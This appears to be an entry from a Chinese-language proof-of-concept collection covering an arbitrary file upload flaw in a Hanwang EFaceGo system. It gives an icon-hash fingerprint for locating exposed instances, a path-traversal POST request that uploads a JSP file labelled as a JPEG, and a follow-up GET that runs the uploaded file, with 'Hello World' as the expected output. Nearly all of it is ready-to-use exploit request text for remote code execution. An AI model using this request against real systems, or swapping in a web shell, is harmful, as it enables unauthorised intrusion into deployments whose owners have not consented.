# 汉王EFaceGo-upload存在任意文件上传导致RCE漏洞

- **系统**：汉王　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="1380907357"`
- **请求**：`POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: image/jpeg
<% out.print("Hello World!"); %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
GET /\manage\\\\operation/upload/dff51db9859542acb792ec888b7c63c1.jsp HTTP/1.1
```
- **预期**：200　|　Hello World